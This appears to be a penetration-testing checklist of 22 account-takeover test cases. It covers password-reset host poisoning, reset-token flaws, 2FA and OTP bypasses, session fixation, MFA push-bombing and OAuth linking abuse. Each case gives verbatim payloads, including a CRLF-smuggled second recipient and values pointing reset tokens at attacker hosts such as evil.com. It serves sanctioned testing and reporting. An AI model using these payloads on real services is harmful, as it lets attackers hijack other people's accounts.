# Account Takeover — Checklist

Expert per-attack **test-case matrix** for Account Takeover — in testing order, impact-first. Each card: where to inject, steps, expected result, verbatim payload, impact, severity, CVSS, tools, references.

*22 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## ATO-001 — Map the auth surface + register two accounts
**Test Category:** Recon &amp; Auth Surface · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** login, register, reset, change-email/phone, change-password, 2FA/OTP, SSO/link, session/logout

**Test Steps:** 1. Enumerate every auth flow: login, register, reset, change-email/phone, change-password, 2FA/OTP, SSO/link, session/logout.<br>2. Capture each request/response; note the MISSING control per flow (re-auth? verification? rate-limit? token binding? host source?).<br>3. Register A (attacker) and B (victim) - your own emails; stand up a listener for poisoned links.

**Expected Result:** A menu of auth flows with the missing control flagged per flow.

**Payload Example:**

```
flows table: reset(no host binding) ; change-email(no re-auth) ; 2FA(force-browsable)
```

**Impact:** The flow that lacks a control the others have is the ATO target.

**Tools:** Burp Suite Pro, interactsh

**References:** CWE-640; OWASP Testing Guide: Authentication + Forgot Password (WSTG-ATHN)

---

## ATO-002 — Reset-link host poisoning (Host / X-Forwarded-Host)
**Test Category:** Password Reset · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** The forgot-password request; Host/X-Forwarded-Host/X-Host headers

**Test Steps:** 1. Trigger the reset FOR B, adding a poisoned host: Host: $ATTACKER ; X-Forwarded-Host: $ATTACKER ; X-Host ; userinfo trick target.com:@$ATTACKER ; dual-Host/CRLF.<br>2. If the reset page loads YOUR resource, the token also leaks via Referer.<br>3. Catch B's token at your listener -&gt; set B's password -&gt; log in as B.

**Expected Result:** B's reset link/token is built with your host and lands at your listener.

**Payload Example:**

```
X-Forwarded-Host: $ATTACKER ; Host: target.com:@$ATTACKER ; then B's token arrives -> set B's pw
```

**Impact:** 0-click account takeover via reset poisoning - Critical.

**Tools:** poc/reset_poison_probe.py, Burp

**References:** CWE-640; CWE-644; HackTricks: Account Takeover

---

## ATO-003 — Reset token disclosed in response / redirect / logs
**Test Category:** Password Reset · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** The forgot-password response

**Test Steps:** 1. Inspect the reset response JSON / redirect / logs for the token or full reset link.<br>2. If present, an attacker can reset ANY email with no interaction.<br>3. Confirm on B.

**Expected Result:** The reset token/link appears in the server response.

**Payload Example:**

```
POST /forgot {email:B} -> 200 {"reset_token":"..."} or Location: /reset?token=...
```

**Impact:** Unauthenticated ATO of any account - Critical.

**Tools:** Burp Repeater

**References:** CWE-640; CWE-200; HackTricks: Account Takeover

---

## ATO-004 — Reset-token weakness (predictable / replay / not-bound)
**Test Category:** Password Reset · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Reset tokens (analyze YOUR OWN)

**Test Steps:** 1. Collect N tokens for your account -&gt; sequential / timestamp / short / low-entropy / base64(userid+ts)?<br>2. Lifecycle: still valid after use / after a 2nd request / after email/password change? (replay).<br>3. NOT bound to user: submit YOUR valid token + B's id/email on the set-password step.

**Expected Result:** A token is guessable, replayable, or accepts a different user's id.

**Payload Example:**

```
poc/reset_token_analyzer.py -> sequential ; MY_TOKEN + id=B on set-password -> B's pw changed
```

**Impact:** Forge/replay reset tokens -&gt; ATO of any account - Critical.

**Tools:** poc/reset_token_analyzer.py

**References:** CWE-640; CWE-330; PortSwigger Web Security Academy: Authentication vulnerabilities

---

## ATO-005 — Reset email parameter abuse (HPP / array / CRLF-CC)
**Test Category:** Password Reset · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** The email field on the reset request

**Test Steps:** 1. HPP/array: email=victim@target.com&amp;email=attacker@evil.com ; {"email":["victim","attacker"]} - validated as B, mailed to you.<br>2. CRLF second recipient: email=victim@target.com%0acc:attacker@evil.com.<br>3. Comma/space multi-recipient. Confirm B's token arrives at your inbox.

**Expected Result:** B's reset token is mailed to an attacker address you control.

**Payload Example:**

```
email=victim@target.com&email=attacker@evil.com ; email=victim@target.com%0acc:attacker@evil.com
```

**Impact:** ATO via email-parameter confusion -&gt; B's token to attacker - Critical.

**Tools:** Burp Repeater

**References:** CWE-640; HackTricks: Account Takeover

---

## ATO-006 — Trusted reset_url / callback body field
**Test Category:** Password Reset · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** reset_url / callbackUrl / domain body fields

**Test Steps:** 1. Add {"reset_url":"https://$ATTACKER/","callbackUrl":"https://$ATTACKER/","domain":"$ATTACKER"} to the reset request.<br>2. If the app builds the link from a body field, the token points at you.<br>3. Confirm B's token lands.

**Expected Result:** The reset link is built from an attacker-supplied body field.

**Payload Example:**

```
{"email":"victim@target.com","reset_url":"https://$ATTACKER/"}
```

**Impact:** 0-click ATO via trusted callback field - Critical.

**Tools:** Burp Repeater

**References:** CWE-640; HackTricks: Account Takeover

---

## ATO-007 — Email normalization / unicode collision
**Test Category:** Password Reset / Registration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Email comparison vs delivery normalization

**Test Steps:** 1. Request B's reset via a 'different' address that normalizes to B: Victim@x.com, victim@x.com., victim+x@x.com, unicode look-alike.<br>2. Signup/lookup treats it as new while delivery resolves to B (or vice versa).<br>3. Confirm you obtain B's reset / collide with B's account.

**Expected Result:** A normalized-twin address yields B's reset or collides with B's account.

**Payload Example:**

```
Victim@target.com ; victim+x@target.com ; vict?m@target.com (unicode)
```

**Impact:** ATO / account collision via normalization mismatch - High/Critical.

**Tools:** Burp Repeater

**References:** CWE-640; CWE-178; HackTricks: Account Takeover

---

## ATO-008 — Structural 2FA bypass (force-browse / session-before-2FA)
**Test Category:** 2FA / OTP · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** The 2FA step in the login flow

**Test Steps:** 1. After the password step, force-browse straight to /dashboard or the authenticated API (skip /2fa).<br>2. If the login response returns a usable session cookie BEFORE 2FA, use it.<br>3. Try the API / mobile / legacy / SSO path that doesn't enforce 2FA.

**Expected Result:** An authenticated session is reached without completing 2FA.

**Payload Example:**

```
password step -> GET /dashboard directly ; session cookie issued pre-2FA
```

**Impact:** 2FA bypass -&gt; full login (with a leaked/known password) - Critical.

**Tools:** Burp Repeater

**References:** CWE-640; CWE-287; HackTricks: Account Takeover

---

## ATO-009 — 2FA response manipulation (client-trusted boolean)
**Test Category:** 2FA / OTP · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** The 2FA verify response

**Test Steps:** 1. Flip a client-trusted flag: {"2fa_required":true}-&gt;false ; {"verified":false}-&gt;true ; {"mfa":"pending"}-&gt;"approved".<br>2. Disable-2FA endpoint without re-auth/OTP; recovery-code path weaker than TOTP.<br>3. Confirm the session proceeds authenticated.

**Expected Result:** A flipped response boolean bypasses the 2FA requirement.

**Payload Example:**

```
{"2fa_required":false} ; {"verified":true} ; POST /2fa/disable (no re-auth)
```

**Impact:** 2FA bypass via client-trusted state - Critical.

**Tools:** Burp Repeater

**References:** CWE-640; CWE-287; HackTricks: Account Takeover

---

## ATO-010 — OTP missing / resettable rate-limit -&gt; brute
**Test Category:** 2FA / OTP · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** The OTP verify endpoint (test on YOUR OWN account)

**Test Steps:** 1. Submit N wrong codes; are they still accepted (no lock)?<br>2. Rate-limit bypass: re-request OTP to reset the counter, new session/cookie per attempt, rotate X-Forwarded-For, parallel race.<br>3. Bounded proof on your own account only - prove RL absent, do NOT crack a real user.

**Expected Result:** Many wrong OTPs are accepted without lockout on your own account.

**Payload Example:**

```
poc/otp_bruteforce.py (bounded) ; re-request OTP to reset counter ; rotate X-Forwarded-For
```

**Impact:** OTP brute-force -&gt; 2FA bypass -&gt; ATO - High/Critical.

**Tools:** poc/otp_bruteforce.py, Turbo Intruder

**References:** CWE-640; CWE-307; PortSwigger Web Security Academy: Authentication vulnerabilities

---

## ATO-011 — OTP value tricks (null / 000000 / array / reuse)
**Test Category:** 2FA / OTP · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** The OTP verify endpoint

**Test Steps:** 1. Malformed values: 000000, "", null, true, otp[]=correct, {"otp":["1",...]}, leading-zero/negative/very-long.<br>2. Reuse: the LAST OTP still valid; same OTP across users.<br>3. OTP leaked in the response, or delivery changeable to your phone/email.

**Expected Result:** A malformed/reused OTP is accepted as valid.

**Payload Example:**

```
{"otp":null} ; otp=000000 ; otp[]=<correct> ; reuse last OTP
```

**Impact:** 2FA bypass via OTP handling flaws - High/Critical.

**Tools:** Burp Repeater

**References:** CWE-640; CWE-287; HackTricks: Account Takeover

---

## ATO-012 — Change email/phone without re-auth or verification
**Test Category:** Email/Phone Change · **Severity:** Critical · **CVSS:** 9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** The change-email/phone endpoint

**Test Steps:** 1. Change email with NO current-password / NO OTP -&gt; set B's email to yours, then reset.<br>2. New email active BEFORE verification; no confirmation to the OLD email.<br>3. Change B's phone/email so the OTP is delivered to YOU (chains with 2FA).

**Expected Result:** The account email/phone changes without re-auth/verification.

**Payload Example:**

```
POST /account/email {"email":"me@evil.com"} (no current password) -> then reset
```

**Impact:** Identity repoint -&gt; recovery hijack -&gt; ATO - Critical.

**Tools:** Burp Repeater

**References:** CWE-640; CWE-620; HackTricks: Account Takeover

---

## ATO-013 — Pre-account-takeover (seed victim email before them)
**Test Category:** Pre-ATO · **Severity:** Critical · **CVSS:** 9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Registration on SSO-enabled apps

**Test Steps:** 1. Register B's email + YOUR password before B (verification not enforced/skippable): {"email":"victim@corp.com","email_verified":true}.<br>2. Victim later 'Sign in with Google/SSO' -&gt; app merges into your pre-existing account.<br>3. Your password still works -&gt; shared access. (Cross-ref OAuth kit.)

**Expected Result:** The victim's SSO login merges into the attacker's pre-seeded account.

**Payload Example:**

```
register victim@corp.com by password now -> victim SSOs later -> accounts merge, attacker pw persists
```

**Impact:** 0-click silent ATO via pre-registration - High/Critical (most-missed).

**Tools:** Burp Repeater

**References:** CWE-640; CWE-287; HackTricks: Account Takeover

---

## ATO-014 — Registration collision / mass-assignment
**Test Category:** Registration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** The register / profile-update endpoint

**Test Steps:** 1. Collision: register Victim@x.com when victim@x.com exists (case/dot/unicode/whitespace) - overwrite/link instead of reject?<br>2. Mass-assignment: {"email":"me@evil.com","email_verified":true,"is_admin":true}.<br>3. Confirm you gain access/privilege on the colliding account.

**Expected Result:** A collision overwrites/links an existing account, or mass-assignment sets privileged fields.

**Payload Example:**

```
register Victim@x.com (existing victim@x.com) ; {"email_verified":true,"is_admin":true}
```

**Impact:** Account collision / privilege self-grant -&gt; ATO/admin - High/Critical.

**Tools:** Burp Repeater

**References:** CWE-640; CWE-915; HackTricks: Account Takeover

---

## ATO-015 — Session fixation &amp; non-invalidation
**Test Category:** Session &amp; Token · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Session cookie lifecycle

**Test Steps:** 1. Fixation: set a known session id for B (cookie/URL); B logs in; if the id is NOT rotated -&gt; your copy is authenticated.<br>2. Session valid AFTER logout / password-change / email-change -&gt; stolen sessions survive.<br>3. 'remember me'/trusted-device token predictable/not-bound/never-expires; token in URL; JWT alg:none/weak (JWT kit).

**Expected Result:** A fixed session is honored, or a session survives logout/password-change.

**Payload Example:**

```
set session=known for B ; B logs in, id unchanged ; session still 200 after /logout + pw change
```

**Impact:** Session takeover / permanent stolen sessions - High/Critical.

**Tools:** Burp Repeater

**References:** CWE-640; CWE-384; PortSwigger Web Security Academy: Authentication vulnerabilities

---

## ATO-016 — IDOR/injection cash-out to ATO
**Test Category:** Chains -&gt; ATO · **Severity:** Critical · **CVSS:** 9.6 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** change-email/password/phone with a userId param; existing primitives

**Test Steps:** 1. IDOR: POST /api/user/{B_id}/email {"email":"me@evil.com"} - change B's creds as A -&gt; reset -&gt; ATO (IDOR kit).<br>2. Mass-assignment/broken object-authz on account update (REST/GraphQL).<br>3. Cash out an existing primitive: XSS(cookie steal)/CSRF/CORS/WebCache-deception/SSRF/SQLi/OAuth -&gt; drive it INTO B's account.

**Expected Result:** A separate primitive is converted into a completed takeover of B.

**Payload Example:**

```
POST /api/user/$B/email {me@evil.com} -> reset -> inside B ; XSS steals B's cookie -> inside B
```

**Impact:** Converts IDOR/XSS/CSRF/etc into Critical ATO - the cash register.

**Tools:** Burp, IDOR/XSS kits

**References:** CWE-640; CWE-639; HackTricks: Account Takeover

---

## ATO-017 — False-positive filter / auto-reject
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Before reporting any candidate

**Test Steps:** 1. REJECT: you only saw YOUR OWN reset token (not B's leak/reset); Host REFLECTED but you never received B's token / never logged in as B; 'no rate-limit'/'token in Referer'/'cookie not HttpOnly' with NO completed takeover; you changed YOUR OWN email (expected); pre-ATO 'possible' but the merge did NOT happen; logout only failing to clear a CLIENT cookie (server session already invalid).<br>2. REQUIRE: the proof ends 'as A (or unauth), I am inside B's account' (B-only marker read).

**Expected Result:** Only completed takeovers of B (two own accounts) survive.

**Payload Example:**

```
reflected host + no token = FP ; own-email-change = FP ; no-rate-limit-alone = lead not finding
```

**Impact:** Protects credibility; ATO is dense with leads-masquerading-as-findings.

**Tools:** manual

**References:** CWE-640; PortSwigger Web Security Academy: Authentication vulnerabilities

---

## ATO-018 — Client-facing impact &amp; SAFE-PoC package
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Confirmed finding, pre-submission

**Test Steps:** 1. Lead with the takeover; confirm reach (any user? admin?) and interaction (zero/one-click); note it usually bypasses MFA.<br>2. Provide the two-account flow: A's actions + proof of reading a B-only marker inside B's account (or B's token caught at your listener).<br>3. Set CVSS 3.1 + the matching CWE (640/287/384/639/307). Remediation: high-entropy single-use user-bound reset tokens, server-set reset host, rate-limit+lockout, re-auth+verify on change, rotate/invalidate sessions, verify-before-merge (pre-ATO).<br>4. Two own accounts, bounded OTP/token tests, RESTORE B's state (note it), never touch a real user; de-dupe to one root cause.

**Expected Result:** A reproducible, correctly-rated, safe two-account PoC with clear remediation.

**Payload Example:**

```
PoC: A's actions + 'inside B' proof (B-only marker / B's token on listener) + CVSS + CWE + remediation.
```

**Impact:** Converts the takeover into a defensible Critical report at the right severity (MFA-bypass argued).

**Tools:** CVSS calculator, ACCOUNT_TAKEOVER_REPORT_TEMPLATE.md

**References:** CWE-640; CWE-287; CWE-384; FIRST CVSS v3.1; OWASP Testing Guide: Authentication + Forgot Password (WSTG-ATHN)  |  TOP REFERENCES: PortSwigger Academy Authentication; disclosed HackerOne/Bugcrowd ATO writeups; HackTricks; OWASP WSTG

---

## ATO-019 — MFA fatigue / push-bombing
**Test Category:** 2FA / OTP · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Push-based MFA approval prompt

**Test Steps:** 1. With valid (or phished) creds, repeatedly trigger the MFA push to the victim<br>2. Fire dozens of approval prompts (optionally timed with a fake IT/support pretext)<br>3. Victim taps Approve out of fatigue/confusion<br>4. Session is granted to the attacker

**Expected Result:** Number-matching + limited push attempts + velocity throttle; deny on repeated prompts

**Payload Example:**

```
loop: POST /mfa/push  (N prompts) until 'approved'
```

**Impact:** MFA fatigue -&gt; victim approves attacker login -&gt; full ATO despite MFA enabled

**Tools:** Burp Intruder, custom script

**References:** CWE-287; CWE-1390; HackTricks 2FA bypass; Microsoft/Uber push-fatigue incident writeups; NIST 800-63B

---

## ATO-020 — WebAuthn / passkey registration &amp; recovery bypass
**Test Category:** 2FA / OTP · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** WebAuthn/passkey registration &amp; account-recovery flow

**Test Steps:** 1. Check whether a weaker fallback factor (SMS/OTP/password) is always available<br>2. Try registering an attacker authenticator to the victim account via IDOR/CSRF on the credential-register endpoint<br>3. Abuse account recovery to downgrade from passkey to password<br>4. Log in with the attacker factor

**Expected Result:** Recovery requires step-up; credential registration is bound + re-authenticated; no silent downgrade

**Payload Example:**

```
POST /webauthn/credentials {attacker attestation} on victim session (no re-auth)
```

**Impact:** Passkey/WebAuthn bypass via weak fallback or attacker-credential registration -&gt; ATO

**Tools:** Burp, Chrome virtual authenticator

**References:** CWE-287; CWE-308; W3C WebAuthn Level 2 spec; FIDO2 security considerations; PortSwigger

---

## ATO-021 — OAuth / social account-linking takeover
**Test Category:** Chains -&gt; ATO · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Account-linking endpoint (link social/OAuth to an existing account)

**Test Steps:** 1. Link your attacker OAuth identity to a victim account by controlling the email/sub, OR pre-link before the victim registers<br>2. When the victim signs in via social, they land in your linked account (or you gain theirs)<br>3. Confirm cross-account access / data<br>4. Prove takeover with a value only the victim sees

**Expected Result:** Linking verifies ownership of both identities + re-auth; email_verified enforced

**Payload Example:**

```
POST /account/link {provider:google, email:victim@x}  (no ownership proof)
```

**Impact:** Account-linking abuse -&gt; attacker identity bound to victim account -&gt; ATO

**Tools:** Burp

**References:** CWE-287; CWE-290; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); PortSwigger OAuth; disclosed account-linking ATO writeups

---

## ATO-022 — Session puzzling / cross-flow session variable confusion
**Test Category:** Session &amp; Token · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Multi-step flows sharing session variables (reset/register/checkout)

**Test Steps:** 1. Start flow A (e.g. password reset) that stores userId/email in the session<br>2. Switch to flow B that reads the same session variable for authorization<br>3. Overwrite the variable via flow A with a victim value<br>4. Complete flow B as the victim

**Expected Result:** Session variables namespaced per-flow + re-validated; no cross-flow trust

**Payload Example:**

```
reset?email=victim  (sets session.userId) -> then /profile trusts session.userId
```

**Impact:** Session puzzling -&gt; cross-flow variable overwrite -&gt; authN/authz bypass -&gt; ATO

**Tools:** Burp

**References:** CWE-384; CWE-841; Shay Chen session-puzzling research (Session Variable Overloading

---
